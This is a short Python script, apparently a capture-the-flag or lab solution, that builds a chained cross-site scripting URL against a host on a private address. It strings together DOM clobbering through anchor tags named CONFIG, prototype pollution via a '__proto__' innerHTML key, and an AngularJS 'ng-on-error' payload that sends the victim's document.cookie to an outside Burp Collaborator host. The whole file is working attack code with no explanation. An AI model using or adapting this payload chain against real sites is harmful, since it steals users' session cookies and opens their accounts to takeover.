#!/usr/bin/env python3

import requests
import json
import html
from urllib.parse import quote_plus

URL = "http://192.168.2.45.nip.io:10000/?name="

ANGULAR_PAYLOAD = """
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js"></script>
    <div ng-app>
      <img
        src="/"
        ng-on-error="window_=$event.srcElement.ownerDocument.defaultView;window_.fetch('https://547y4veptsxml6f260ftthbjxa35ru.burpcollaborator.net/?angular-leak='+window_.document.cookie)"
      />
    </div>
"""

PROTOTYPE_POLLUTION_PAYLOAD = json.dumps({
    "text" : "text",
    "__proto__": {
        "innerHTML": """
            <iframe srcdoc="{}"></iframe>
        """.format(html.escape(ANGULAR_PAYLOAD))
    }
})
ARBITRARY_CONTENT_URL = "http://192.168.2.45.nip.io:10000/404.php?msg={}".format(
        quote_plus(PROTOTYPE_POLLUTION_PAYLOAD))

NAME = """
    <a id=CONFIG></a>
    <a id=CONFIG name=url href="{}">
    <x x="
""".format(html.escape(ARBITRARY_CONTENT_URL))

print(URL + quote_plus(NAME))
